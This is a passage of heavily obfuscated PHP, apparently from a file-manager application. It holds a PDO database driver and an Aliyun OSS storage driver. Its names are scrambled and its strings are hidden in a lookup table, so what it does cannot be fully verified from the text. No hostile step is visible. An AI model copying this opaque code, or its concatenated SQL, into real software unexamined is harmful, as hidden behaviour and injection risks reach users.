($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $“ƒ«Û¿ = $this->_linkID->commit(); $this->transTimes = 0; if (!$“ƒ«Û¿) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÊŞàŞÎ» = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÊŞàŞÎ») { $this->error(); return !1; } } return !0; } private function getAll() { $µ¥Œ®Ç¼ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($µ¥Œ®Ç¼); return $µ¥Œ®Ç¼; } public function getFields($ªòˆù) { $ùÌ¢Î®ï =& $_SERVER[¬ÏÕ§Áú]; $this->initConnect(!0); if (think_config($ùÌ¢Î®ï[1058])) { $†³–ñî = str_replace($ùÌ¢Î®ï[1059], $ªòˆù, think_config($ùÌ¢Î®ï[1058])); } else { switch ($this->dbType) { case $ùÌ¢Î®ï[1042]: case $ùÌ¢Î®ï[1060]: $†³–ñî = "\123\x45\x4c\x45\x43\124\40\40\x20\143\157\x6c\165\155\156\x5f\x6e\x61\x6d\x65\x20\x61\x73\40\x27\x4e\x61\x6d\145\47\x2c\x20\40\x20\x64\x61\x74\141\137\164\x79\x70\145\x20\x61\x73\x20\x27\x54\171\x70\145\47\54\x20\x20\x20\x63\157\x6c\165\155\156\137\144\145\146\x61\x75\x6c\164\40\141\x73\x20\47\x44\x65\146\x61\165\154\x74\x27\54\40\40\x20\151\163\137\156\x75\x6c\x6c\141\142\154\145\x20\x61\163\x20\47\x4e\x75\154\154\x27\12\x9\x9\106\122\117\x4d\x9\151\x6e\146\x6f\162\x6d\141\x74\x69\157\x6e\137\x73\143\x68\x65\155\x61\56\x74\x61\142\x6c\x65\163\x20\101\123\40\x74\xa\11\x9\112\117\111\116\11\x69\x6e\x66\157\162\x6d\x61\164\151\x6f\156\x5f\163\x63\150\x65\155\x61\56\x63\x6f\154\x75\155\156\163\x20\101\123\x20\143\12\11\11\117\116\40\x20\164\56\164\x61\x62\154\x65\x5f\x63\141\x74\141\x6c\x6f\x67\40\75\40\x63\56\164\x61\x62\154\145\x5f\143\x61\164\x61\154\157\147\xa\11\11\101\116\104\40\164\x2e\164\x61\x62\x6c\145\137\x73\x63\150\x65\x6d\x61\40\75\40\143\x2e\164\x61\x62\x6c\x65\137\x73\143\150\145\155\141\12\11\11\101\116\104\40\164\56\164\141\x62\x6c\145\x5f\156\x61\x6d\145\x20\x3d\40\x63\x2e\164\x61\x62\154\145\x5f\156\141\x6d\145\xa\x9\x9\x57\110\105\x52\105\40\40\40\164\56\164\x61\x62\154\145\x5f\x6e\141\155\x65\x20\75\x20\47{$ªòˆù}\47"; break; case $ùÌ¢Î®ï[1061]: $†³–ñî = $ùÌ¢Î®ï[1062] . $ªòˆù . $ùÌ¢Î®ï[1063]; break; case $ùÌ¢Î®ï[1043]: case $ùÌ¢Î®ï[1045]: $†³–ñî = $ùÌ¢Î®ï[1064] . $ùÌ¢Î®ï[1065] . $ùÌ¢Î®ï[1066] . strtoupper($ªòˆù) . $ùÌ¢Î®ï[1067] . strtoupper($ªòˆù) . $ùÌ¢Î®ï[1068]; break; case $ùÌ¢Î®ï[1069]: $†³–ñî = $ùÌ¢Î®ï[1070] . $ªòˆù . $ùÌ¢Î®ï[1071]; break; case $ùÌ¢Î®ï[1044]: break; case $ùÌ¢Î®ï[1072]: default: $†³–ñî = $ùÌ¢Î®ï[1073] . ($this->dbType == $ùÌ¢Î®ï[1072] ? "\x60{$ªòˆù}\140" : $ªòˆù); } } $‹ÑõœØ = $this->query($†³–ñî); $¹œ‘™Œı = array(); if ($‹ÑõœØ) { foreach ($‹ÑõœØ as $¢µšçõ¢ => $‡¤ƒË²ø) { $‡¤ƒË²ø = array_change_key_case($‡¤ƒË²ø); $‡¤ƒË²ø[$ùÌ¢Î®ï[32]] = isset($‡¤ƒË²ø[$ùÌ¢Î®ï[32]]) ? $‡¤ƒË²ø[$ùÌ¢Î®ï[32]] : $ùÌ¢Î®ï[69]; $‡¤ƒË²ø[$ùÌ¢Î®ï[33]] = isset($‡¤ƒË²ø[$ùÌ¢Î®ï[33]]) ? $‡¤ƒË²ø[$ùÌ¢Î®ï[33]] : $ùÌ¢Î®ï[69]; $€®å°¢ó = isset($‡¤ƒË²ø[$ùÌ¢Î®ï[362]]) ? $‡¤ƒË²ø[$ùÌ¢Î®ï[362]] : $‡¤ƒË²ø[$ùÌ¢Î®ï[32]]; $¹œ‘™Œı[$€®å°¢ó] = array($ùÌ¢Î®ï[32] => $€®å°¢ó, $ùÌ¢Î®ï[33] => $‡¤ƒË²ø[$ùÌ¢Î®ï[33]], $ùÌ¢Î®ï[35] => (bool) (isset($‡¤ƒË²ø[$ùÌ¢Î®ï[116]]) && $‡¤ƒË²ø[$ùÌ¢Î®ï[116]] === $ùÌ¢Î®ï[12] || isset($‡¤ƒË²ø[$ùÌ¢Î®ï[35]]) && $‡¤ƒË²ø[$ùÌ¢Î®ï[35]] === $ùÌ¢Î®ï[12]), $ùÌ¢Î®ï[37] => isset($‡¤ƒË²ø[$ùÌ¢Î®ï[37]]) ? $‡¤ƒË²ø[$ùÌ¢Î®ï[37]] : (isset($‡¤ƒË²ø[$ùÌ¢Î®ï[56]]) ? $‡¤ƒË²ø[$ùÌ¢Î®ï[56]] : $ùÌ¢Î®ï[69]), $ùÌ¢Î®ï[39] => isset($‡¤ƒË²ø[$ùÌ¢Î®ï[107]]) ? strtolower($‡¤ƒË²ø[$ùÌ¢Î®ï[107]]) == $ùÌ¢Î®ï[41] : (isset($‡¤ƒË²ø[$ùÌ¢Î®ï[57]]) ? $‡¤ƒË²ø[$ùÌ¢Î®ï[57]] : !1), $ùÌ¢Î®ï[42] => isset($‡¤ƒË²ø[$ùÌ¢Î®ï[1074]]) ? strtolower($‡¤ƒË²ø[$ùÌ¢Î®ï[1074]]) == $ùÌ¢Î®ï[44] : (isset($‡¤ƒË²ø[$ùÌ¢Î®ï[107]]) ? $‡¤ƒË²ø[$ùÌ¢Î®ï[107]] : !1)); } } return $¹œ‘™Œı; } public function getTables($¬¤€×€ì = '') { $ÓÓäÌ» =& $_SERVER[¬ÏÕ§Áú]; if (think_config($ÓÓäÌ»[1075])) { $ÜÂëÚÜË = str_replace($ÓÓäÌ»[1076], $¬¤€×€ì, think_config($ÓÓäÌ»[1075])); } else { switch ($this->dbType) { case $ÓÓäÌ»[1043]: case $ÓÓäÌ»[1045]: $ÜÂëÚÜË = $ÓÓäÌ»[1077]; break; case $ÓÓäÌ»[1042]: case $ÓÓäÌ»[1060]: $ÜÂëÚÜË = $ÓÓäÌ»[1078]; break; case $ÓÓäÌ»[1069]: $ÜÂëÚÜË = $ÓÓäÌ»[1079]; break; case $ÓÓäÌ»[1044]: think_exception(think_lang($ÓÓäÌ»[1080]) . $ÓÓäÌ»[1081]); break; case $ÓÓäÌ»[1061]: $ÜÂëÚÜË = $ÓÓäÌ»[45] . $ÓÓäÌ»[46] . $ÓÓäÌ»[47]; break; case $ÓÓäÌ»[1072]: default: if (!empty($¬¤€×€ì)) { $ÜÂëÚÜË = $ÓÓäÌ»[1021] . $¬¤€×€ì . $ÓÓäÌ»[1022]; } else { $ÜÂëÚÜË = $ÓÓäÌ»[1023]; } } } $…¶ÅË¬ = $this->query($ÜÂëÚÜË); $Ÿ›½Æœ¬ = array(); foreach ($…¶ÅË¬ as $öáã÷¸ü => $ü‘²‘ùÒ) { $Ÿ›½Æœ¬[$öáã÷¸ü] = current($ü‘²‘ùÒ); } return $Ÿ›½Æœ¬; } protected function parseLimit($¾×°ß†) { $åçã‹±Î =& $_SERVER[¬ÏÕ§Áú]; $„ç´¨å = $åçã‹±Î[12]; if (!empty($¾×°ß†)) { switch ($this->dbType) { case $åçã‹±Î[1069]: case $åçã‹±Î[1061]: $¾×°ß† = explode($åçã‹±Î[50], $¾×°ß†); if (count($¾×°ß†) > 1) { $„ç´¨å .= $åçã‹±Î[51] . $¾×°ß†[1] . $åçã‹±Î[52] . $¾×°ß†[0] . $åçã‹±Î[53]; } else { $„ç´¨å .= $åçã‹±Î[51] . $¾×°ß†[0] . $åçã‹±Î[53]; } break; case $åçã‹±Î[1042]: case $åçã‹±Î[1060]: break; case $åçã‹±Î[1044]: break; case $åçã‹±Î[1043]: case $åçã‹±Î[1045]: break; case $åçã‹±Î[1072]: default: $„ç´¨å .= $åçã‹±Î[51] . $¾×°ß† . $åçã‹±Î[53]; } } return $„ç´¨å; } public function parseKey(&$Õß‡ÀÙ¬, $ç—¯•ç‘ = true) { $”Ú£øˆ­ =& $_SERVER[¬ÏÕ§Áú]; if ($ç—¯•ç‘) { $Õß‡ÀÙ¬ = $this->parseKeyCheck($Õß‡ÀÙ¬); } if ($this->dbType == $”Ú£øˆ­[1072]) { if ($Õß‡ÀÙ¬ != $”Ú£øˆ­[233] && !preg_match($”Ú£øˆ­[1036], $Õß‡ÀÙ¬)) { $Õß‡ÀÙ¬ = $”Ú£øˆ­[481] . trim($Õß‡ÀÙ¬, $”Ú£øˆ­[481]) . $”Ú£øˆ­[481]; } return $Õß‡ÀÙ¬; } else { return parent::parseKey($Õß‡ÀÙ¬, $ç—¯•ç‘); } } public function close() { $this->_linkID = null; } public function error() { $æêŠÃü© =& $_SERVER[¬ÏÕ§Áú]; if ($this->PDOStatement) { $åŠÈçœ = $this->PDOStatement->errorInfo(); $this->error = $åŠÈçœ[1] . $æêŠÃü©[4] . $åŠÈçœ[2]; } else { $this->error = $æêŠÃü©[12]; } if ($æêŠÃü©[12] != $this->queryStr) { $this->error .= LNG($æêŠÃü©[48]) . $this->queryStr; } think_trace($this->error, $æêŠÃü©[12], $æêŠÃü©[49]); return $this->error; } public function escapeString($ø¦óòùí) { $ï»ËŒñî =& $_SERVER[¬ÏÕ§Áú]; switch ($this->dbType) { case $ï»ËŒñî[1069]: case $ï»ËŒñî[1042]: case $ï»ËŒñî[1060]: case $ï»ËŒñî[1072]: return addslashes($ø¦óòùí); case $ï»ËŒñî[1044]: case $ï»ËŒñî[1061]: case $ï»ËŒñî[1043]: case $ï»ËŒñî[1045]: return str_ireplace($ï»ËŒñî[58], $ï»ËŒñî[59], $ø¦óòùí); } } protected function parseValue($ŸÄ÷Ç«À) { $¸Õ¹Ğ¢ =& $_SERVER[¬ÏÕ§Áú]; if (is_string($ŸÄ÷Ç«À)) { $ŒÃşÌ´ = strpos($ŸÄ÷Ç«À, $¸Õ¹Ğ¢[4]) === 0 && in_array($ŸÄ÷Ç«À, array_keys($this->bind)); $ŸÄ÷Ç«À = $ŒÃşÌ´ ? $this->escapeString($ŸÄ÷Ç«À) : $¸Õ¹Ğ¢[1082] . $this->escapeString($ŸÄ÷Ç«À) . $¸Õ¹Ğ¢[1082]; } elseif (isset($ŸÄ÷Ç«À[0]) && is_string($ŸÄ÷Ç«À[0]) && strtolower($ŸÄ÷Ç«À[0]) == $¸Õ¹Ğ¢[383]) { $ŸÄ÷Ç«À = $this->escapeString($ŸÄ÷Ç«À[1]); } elseif (is_array($ŸÄ÷Ç«À)) { $ŸÄ÷Ç«À = array_map(array($this, $¸Õ¹Ğ¢[1083]), $ŸÄ÷Ç«À); } elseif (is_bool($ŸÄ÷Ç«À)) { $ŸÄ÷Ç«À = $ŸÄ÷Ç«À ? $¸Õ¹Ğ¢[101] : $¸Õ¹Ğ¢[241]; } elseif (is_null($ŸÄ÷Ç«À)) { $ŸÄ÷Ç«À = $¸Õ¹Ğ¢[116]; } return $ŸÄ÷Ç«À; } public function getLastInsertId() { $ü¥É‚Îä =& $_SERVER[¬ÏÕ§Áú]; switch ($this->dbType) { case $ü¥É‚Îä[1069]: case $ü¥É‚Îä[1061]: case $ü¥É‚Îä[1042]: case $ü¥É‚Îä[1060]: case $ü¥É‚Îä[1044]: case $ü¥É‚Îä[1072]: return $this->_linkID->lastInsertId(); case $ü¥É‚Îä[1043]: case $ü¥É‚Îä[1045]: $‡ ´Üªı = $this->table; $¡Í¶“’ = $this->query("\123\x45\x4c\105\x43\x54\x20{$‡ ´Üªı}\x2e\143\165\162\x72\x76\141\154\40\143\x75\162\162\x76\141\154\40\106\x52\117\x4d\x20\x64\x75\141\x6c"); return $¡Í¶“’ ? $¡Í¶“’[0][$ü¥É‚Îä[1084]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($°š£ğà…) { $±×‘£ =& $_SERVER[¬ÏÕ§Áú]; if (!CacheLock::fileLock($±×‘£[13])) { return !1; } $¢şÜ »´ = parent::query($°š£ğà…); CacheLock::fileUnLock($±×‘£[13]); return $¢şÜ »´; } public function execute($ÎÇ‰àæÂ) { $ÁÜ•øË =& $_SERVER[¬ÏÕ§Áú]; if (!CacheLock::fileLock($ÁÜ•øË[13])) { return !1; } $ûÙçŸ÷» = parent::execute($ÎÇ‰àæÂ); CacheLock::fileUnLock($ÁÜ•øË[13]); return $ûÙçŸ÷»; } } goto CÃŠ±¤¶Ğß; e¿¥„ÜÓ¿Ş: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($Øé’ıœ£) { parent::__construct(); include_once SDK_DIR . $_SERVER[¬ÏÕ§Áú][1525]; $this->_init($Øé’ıœ£); } public function _init($‚‹ÁÈº) { $’®åş =& $_SERVER[¬ÏÕ§Áú]; $this->config = $‚‹ÁÈº; foreach ($‚‹ÁÈº as $¡¡Šç–¹ => $£¹×ŠƒÂ) { if (isset($this->{$¡¡Šç–¹})) { $this->{$¡¡Šç–¹} = $£¹×ŠƒÂ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($’®åş[1526] . LNG($’®åş[1527])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $·ŠïÉó© =& $_SERVER[¬ÏÕ§Áú]; $³ïŒ»€ = new OSS\Model\CorsConfig(); $ğå¦âæÔ = new OSS\Model\CorsRule(); $ğå¦âæÔ->addAllowedOrigin($·ŠïÉó©[1528]); $ğå¦âæÔ->addAllowedMethod($·ŠïÉó©[1529]); $ğå¦âæÔ->addAllowedMethod($·ŠïÉó©[1530]); $ğå¦âæÔ->addAllowedMethod($·ŠïÉó©[1531]); $ğå¦âæÔ->addAllowedMethod($·ŠïÉó©[1532]); $ğå¦âæÔ->addAllowedMethod($·ŠïÉó©[175]); $ğå¦âæÔ->setMaxAgeSeconds(600); $ğå¦âæÔ->addExposeHeader($·ŠïÉó©[1533]); $ğå¦âæÔ->addAllowedHeader($·ŠïÉó©[1528]); $³ïŒ»€->addRule($ğå¦âæÔ); try { $this->client->putBucketCors($this->bucket, $³ïŒ»€); } catch (OSS\Core\OssException $ç­®…ú•) { $this->writeLog(__FUNCTION__ . $·ŠïÉó©[225] . $ç­®…ú•->getMessage()); return !1; } return !0; } public function getBucketCors() { $¤úçëİş =& $_SERVER[¬ÏÕ§Áú]; $ÅäçØ¤Ç = null; try { $ÅäçØ¤Ç = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $İ×É¢¢¸) { $this->writeLog(__FUNCTION__ . $¤úçëİş[225] . $İ×É¢¢¸->getMessage()); return null; } if (!$ÅäçØ¤Ç || !($õ“ó¿Î‹ = $ÅäçØ¤Ç->getRules())) { return null; } $¢Ã¨¤È = $õ“ó¿Î‹[0]->getAllowedOrigins(); $˜ƒÃ›£Ÿ = $õ“ó¿Î‹[0]->getAllowedMethods(); $€¼‘ëÈ¸ = $õ“ó¿Î‹[0]->getMaxAgeSeconds(); $Ÿäµ·Ââ = $õ“ó¿Î‹[0]->getExposeHeaders(); $ò³ÚºÅ = $õ“ó¿Î‹[0]->getAllowedHeaders(); return array($¤úçëİş[231] => isset($¢Ã¨¤È[0]) ? $¢Ã¨¤È[0] : $¤úçëİş[12], $¤úçëİş[235] => $˜ƒÃ›£Ÿ, $¤úçëİş[1534] => $€¼‘ëÈ¸, $¤úçëİş[1535] => isset($Ÿäµ·Ââ[0]) ? $Ÿäµ·Ââ[0] : $¤úçëİş[12], $¤úçëİş[232] => isset($ò³ÚºÅ[0]) ? $ò³ÚºÅ[0] : $¤úçëİş[12]); } public function isBucketCors() { $·ÉäÒ =& $_SERVER[¬ÏÕ§Áú]; $¿šÁ”ë = $this->getBucketCors(); if (!$¿šÁ”ë || !is_array($¿šÁ”ë)) { return !1; } if ($¿šÁ”ë[$·ÉäÒ[231]] != $·ÉäÒ[233] || $¿šÁ”ë[$·ÉäÒ[232]] != $·ÉäÒ[233]) { return !1; } $û¦ò×» = array_map($·ÉäÒ[234], $¿šÁ”ë[$·ÉäÒ[235]]); if (!is_array($û¦ò×»)) { $û¦ò×» = array(); } $íãí²Á´ = array($·ÉäÒ[236], $·ÉäÒ[237], $·ÉäÒ[238], $·ÉäÒ[239], $·ÉäÒ[240]); $¸Åõœ™î = array_diff($íãí²Á´, $û¦ò×»); return empty($¸Åõœ™î); } public function mkfile($˜×â²€ , $Õó†ÄôÛ = '', $ÌŠàıú€ = REPEAT_RENAME) { $†ûƒñè‹ = $this->setContent($˜×â²€ , $Õó†ÄôÛ); if ($†ûƒñè‹ !== !1) { return $this->getPathOuter($˜×â²€ ); } return !1; } public function mkdir($ÉßŸ¦‚ê, $ÏÄî¦—û = REPEAT_SKIP) { if ($ÏÄî¦—û && $this->_isFolder($ÉßŸ¦‚ê)) { return $this->getPathOuter($ÉßŸ¦‚ê); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ÉßŸ¦‚ê)); } catch (OSS\Core\OssException $ûºÛ¼ñ) { $this->writeLog(__FUNCTION__ . $_SERVER[¬ÏÕ§Áú][225] . $ûºÛ¼ñ->getMessage()); return !1; } return $this->getPathOuter($ÉßŸ¦‚ê); } private function fileList($÷ÏÜƒµ, $õÏŞ™ß– = '', $¶Ç¦¦Òã = 0) { $ğæ°ÙŸÔ =& $_SERVER[¬ÏÕ§Áú]; $÷ÏÜƒµ = trim($÷ÏÜƒµ, $ğæ°ÙŸÔ[8]); $ß¨¹Æ· = empty($÷ÏÜƒµ) && $÷ÏÜƒµ !== $ğæ°ÙŸÔ[241] ? $ğæ°ÙŸÔ[12] : $÷ÏÜƒµ . $ğæ°ÙŸÔ[8]; $ÂĞ¬€¢Î = $ğæ°ÙŸÔ[12]; $µßÃ…… = 1000; $§¢ÇÙ”² = $üµÜòÊ¬ = array(); while (!0) { check_abort(); $Òªù«ü¢ = array($ğæ°ÙŸÔ[1536] => $õÏŞ™ß–, $ğæ°ÙŸÔ[1537] => $ß¨¹Æ·, $ğæ°ÙŸÔ[1538] => $µßÃ……, $ğæ°ÙŸÔ[1539] => $ÂĞ¬€¢Î); try { $Èæ…Å = $this->client->listObjects($this->bucket, $Òªù«ü¢); } catch (OSS\Core\OssException $£Ã§°±») { $this->writeLog(__FUNCTION__ . $ğæ°ÙŸÔ[225] . $£Ã§°±»->getMessage()); break; } $ÂĞ¬€¢Î = $Èæ…Å->getNextMarker(); $©£³÷î = $Èæ…Å->getObjectList(); $è‚“Àè£ = $Èæ…Å->getPrefixList(); foreach ($©£³÷î as $ŒÎŒÜ«Ò) { if ($ŒÎŒÜ«Ò->getKey() == $ß¨¹Æ·) { continue; } $ç™ÕÏ = $ŒÎŒÜ«Ò->getKey(); $¦ùÆêæä = $ŒÎŒÜ«Ò->getSize(); $ÈåË›ù® = $ŒÎŒÜ«Ò->getLastModified(); $Û¸ùääÏ = trim($ŒÎŒÜ«Ò->getETag(), $ğæ°ÙŸÔ[131]); $×­õÖŞ¢ = $¶Ç¦¦Òã ? array($ğæ°ÙŸÔ[32] => $ç™ÕÏ, $ğæ°ÙŸÔ[89] => $¦ùÆêæä, $ğæ°ÙŸÔ[217] => strtotime($ÈåË›ù®), $ğæ°ÙŸÔ[1540] => $Û¸ùääÏ) : $ç™ÕÏ; $Û£ò¯áĞ = $¦ùÆêæä == 0 && substr($ç™ÕÏ, strlen($ç™ÕÏ) - 1, 1) == $ğæ°ÙŸÔ[8] ? !0 : !1; $ÒËÎòúº = array($ğæ°ÙŸÔ[89] => $¦ùÆêæä, $ğæ°ÙŸÔ[1541] => $¦ùÆêæä, $ğæ°ÙŸÔ[98] => strtotime($ÈåË›ù®), $ğæ°ÙŸÔ[1542] => $ÈåË›ù®, $ğæ°ÙŸÔ[1540] => $Û¸ùääÏ); $this->cacheMethodInfoSet($ç™ÕÏ, $Û£ò¯áĞ, $ÒËÎòúº); if ($Û£ò¯áĞ) { $§¢ÇÙ”²[] = $ç™ÕÏ; continue; } $üµÜòÊ¬[] = $×­õÖŞ¢; } foreach ($è‚“Àè£ as $„“Õ“«) { $§¢ÇÙ”²[] = $„“Õ“«->getPrefix(); $this->cacheMethodInfoSet($„“Õ“«->getPrefix(), !0); } if ($ÂĞ¬€¢Î === $ğæ°ÙŸÔ[12]) { break; } } $this->cacheMethodInfoSet($÷ÏÜƒµ, !0); return array($ğæ°ÙŸÔ[95] => $§¢ÇÙ”², $ğæ°ÙŸÔ[96] => $üµÜòÊ¬); } public function listObject($ê¤°¥û , $ŠêìÕ¢š = '') { $çœêÜÚ¬ =& $_SERVER[¬ÏÕ§Áú]; $ê¤°¥û  = trim($ê¤°¥û , $çœêÜÚ¬[8]); $¨­±Ê•º = empty($ê¤°¥û ) && $ê¤°¥û  !== $çœêÜÚ¬[241] ? $çœêÜÚ¬[12] : $ê¤°¥û  . $çœêÜÚ¬[8]; $ù€­¥ï = $çœêÜÚ¬[12]; $ıú‚ËÀ = 1000; $ÊŠíÄ¯Ø = $æË“˜ØŒ = array(); while (!0) { check_abort(); $‚¯¢… = array($çœêÜÚ¬[1536] => $ŠêìÕ¢š, $çœêÜÚ¬[1537] => $¨­±Ê•º, $çœêÜÚ¬[1538] => $ıú‚ËÀ, $çœêÜÚ¬[1539] => $ù€­¥ï); try { $ˆëàÆ = $this->client->listObjects($this->bucket, $‚¯¢…); } catch (OSS\Core\OssException $²Õ›‡„Ê) { $this->writeLog(__FUNCTION__ . $çœêÜÚ¬[225] . $²Õ›‡„Ê->getMessage()); break; } $ù€­¥ï = $ˆëàÆ->getNextMarker(); $ÅÉÆÎ‚ó = $ˆëàÆ->getObjectList(); foreach ($ÅÉÆÎ‚ó as $§¹ÌµŒ•) { if ($§¹ÌµŒ•->getKey() == $¨­±Ê•º) { continue; } $·Ìé¶šÈ = $§¹ÌµŒ•->getKey(); $²Š±¡‡§ = $§¹ÌµŒ•->getSize(); $·»£è— = $²Š±¡‡§ == 0 && substr($·Ìé¶šÈ, strlen($·Ìé¶šÈ) - 1, 1) == $çœêÜÚ¬[8] ? !0 : !1; if ($·»£è—) { continue; } $æË“˜ØŒ[] = $²Š±¡‡§ . $çœêÜÚ¬[225] . $·Ìé¶šÈ; } if ($ù€­¥ï === $çœêÜÚ¬[12]) { break; } } return array($çœêÜÚ¬[95] => $ÊŠíÄ¯Ø, $çœêÜÚ¬[96] => $æË“˜ØŒ); } public function copyFile($’Ñü‡©, $†ê¦èš) { $ø¬Ñù†† = $this->size($’Ñü‡©); if ($ø¬Ñù†† < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $’Ñü‡©, $this->bucket, $this->pathEncode($†ê¦èš)); } catch (OSS\Core\OssException $²†´µ§–) { $this->writeLog(__FUNCTION__ . $_SERVER[¬ÏÕ§Áú][225] . $²†´µ§–->getMessage()); return !1; } return $this->getPathOuter($†ê¦èš); } $áÍ“×÷Æ = $this->multiCopyObject($’Ñü‡©, $†ê¦èš, $ø¬Ñù††); return $áÍ“×÷Æ ? $this->getPathOuter($†ê¦èš) : !1; } private function multiCopyObject($„®ıö¾, $ığ›”ˆ¦, $ÌÑ¥‘å¤) { $ûÈßÖÕ =& $_SERVER[¬ÏÕ§Áú]; try { $õ•ø€„ = array(); if ($İ…ÂŞ‡Å = $this->hashMd5($„®ıö¾)) { $õ•ø€„ = array(OSS\OssClient::OSS_HEADERS => array($ûÈßÖÕ[1543] => $İ…ÂŞ‡Å)); } $†ïáŸ¿Œ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ığ›”ˆ¦), $õ•ø€„); $Œ†Ô„÷ = 1; $Ğ­—®õí = 0; $´Úİç = array(); $œÇÎ‹îø = 1024 * 1024 * 10; $’ê¬ùë§ = $this->client->generateMultiuploadParts($ÌÑ¥‘å¤, $œÇÎ‹îø); foreach ($’ê¬ùë§ as $¢‘æ¯–ô => $ŠüõÕ½¼) { $€ëÜæêğ = $Ğ­—®õí + (int) $ŠüõÕ½¼[$ûÈßÖÕ[1544]]; $Èö¶‹Ü = (int) $ŠüõÕ½¼[$ûÈßÖÕ[423]] + $€ëÜæêğ - 1; $ØËØÜÌµ = array($ûÈßÖÕ[177] => $€ëÜæêğ, $ûÈßÖÕ[178] => $Èö¶‹Ü); $´Úİç[] = $this->client->uploadPartCopy($this->bucket, $„®ıö¾, $this->bucket, $this->pathEncode($ığ›”ˆ¦), $Œ†Ô„÷, $†ïáŸ¿Œ, $ØËØÜÌµ); $Œ†Ô„÷ = $Œ†Ô„÷ + 1; } $…–Šˆñ­ = array(); foreach ($´Úİç as $¢‘æ¯–ô => $Ù­ĞŸ¿û) { $…–Šˆñ­[] = array($ûÈßÖÕ[309] => $¢‘æ¯–ô + 1, $ûÈßÖÕ[310] => $Ù­ĞŸ¿û); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ığ›”ˆ¦), $†ïáŸ¿Œ, $…–Šˆñ­); } catch (OSS\Core\OssException $‡úä¦–„) { $this->writeLog(__FUNCTION__ . $ûÈßÖÕ[225] . $‡úä¦–„->getMessage()); return !1; } return !0; } public function moveFile($§¯¬ºŸÀ, $¤±÷Ãßá) { if ($this->copyFile($§¯¬ºŸÀ, $¤±÷Ãßá)) { $this->remove($§¯¬ºŸÀ); return $this->getPathOuter($¤±÷Ãßá); } return !1; } public function delFile($äõˆÛÜ¸) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($äõˆÛÜ¸)); } catch (OSS\Core\OssException $³üÎÆ³) { $this->writeLog(__FUNCTION__ . $_SERVER[¬ÏÕ§Áú][225] . $³üÎÆ³->getMessage()); return !1; } return !0; } public function delFolder($‚òÖ­¿·) { $„§ä²ª§ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->exist($‚òÖ­¿·)) { return !0; } $this->listItemCache = !1; $ÑËÑı‡ = $this->fileList($‚òÖ­¿·); $this->listItemCache = !0; $ï–Áç›õ = trim($‚òÖ­¿·, $„§ä²ª§[8]) . $„§ä²ª§[8]; if (!empty($‚òÖ­¿·) && $‚òÖ­¿· !== $„§ä²ª§[241] && !in_array($ï–Áç›õ, $ÑËÑı‡[$„§ä²ª§[95]])) { $ÑËÑı‡[$„§ä²ª§[95]][] = $ï–Áç›õ; } $¦Œö“  = $this->delByBatch($ÑËÑı‡[$„§ä²ª§[96]]); if (!$¦Œö“ ) { return !1; } $¦Œö“  = $this->delByBatch($ÑËÑı‡[$„§ä²ª§[95]]); if (!$¦Œö“ ) { return !1; } return $this->delFile($ï–Áç›õ); } private function delByBatch($øŒ‡Æ¡Ş) { foreach (array_chunk($øŒ‡Æ¡Ş, 1000) as $ºà€ÚõŞ) { try { $this->client->deleteObjects($this->bucket, $ºà€ÚõŞ); } catch (OSS\Core\OssException $»°ö¾İ€) { $this->writeLog(__FUNCTION__ . $_SERVER[¬ÏÕ§Áú][225] . $»°ö¾İ€->getMessage()); return !1; } } return !0; } public function rename($ê‘€é¶, $Á˜¶•¶—) { return $this->renameObject($ê‘€é¶, $Á˜¶•¶—); } private function fileInfo($¿á±Ñ¬ß, $€õ€˜›í = false, $¦Ó…ñ›• = array()) { $à¨“Ã¥ =& $_SERVER[¬ÏÕ§Áú]; $Ü“¹²‚À = array($à¨“Ã¥[32] => $this->pathThis($¿á±Ñ¬ß), $à¨“Ã¥[97] => $this->getPathOuter($¿á±Ñ¬ß), $à¨“Ã¥[33] => $à¨“Ã¥[243], $à¨“Ã¥[89] => isset($¦Ó…ñ›•[$à¨“Ã¥[89]]) ? $¦Ó…ñ›•[$à¨“Ã¥[89]] : 0, $à¨“Ã¥[179] => $this->ext($¿á±Ñ¬ß)); if ($€õ€˜›í) { return $Ü“¹²‚À; } $Ü“¹²‚À[$à¨“Ã¥[244]] = $Ü“¹²‚À[$à¨“Ã¥[98]] = 0; $Ü“¹²‚À[$à¨“Ã¥[245]] = $Ü“¹²‚À[$à¨“Ã¥[246]] = !0; if (empty($¦Ó…ñ›•)) { $œ¡ÑÁ‘û = $this->objectMeta($¿á±Ñ¬ß); if (!$œ¡ÑÁ‘û) { return $Ü“¹²‚À; } $¦Ó…ñ›• = array($à¨“Ã¥[98] => strtotime($œ¡ÑÁ‘û[$à¨“Ã¥[1542]]), $à¨“Ã¥[89] => $œ¡ÑÁ‘û[$à¨“Ã¥[1541]] + 0, $à¨“Ã¥[1540] => $œ¡ÑÁ‘û[$à¨“Ã¥[1540]]); } if (isset($¦Ó…ñ›•[$à¨“Ã¥[1540]]) && $¦Ó…ñ›•[$à¨“Ã¥[1540]]) { $Ü“¹²‚À[$à¨“Ã¥[248]] = trim($¦Ó…ñ›•[$à¨“Ã¥[1540]], $à¨“Ã¥[131]); } if (isset($¦Ó…ñ›•[$à¨“Ã¥[89]])) { $Ü“¹²‚À[$à¨“Ã¥[89]] = $¦Ó…ñ›•[$à¨“Ã¥[89]]; } if (isset($¦Ó…ñ›•[$à¨“Ã¥[98]])) { $Ü“¹²‚À[$à¨“Ã¥[98]] = $¦Ó…ñ›•[$à¨“Ã¥[98]]; } if 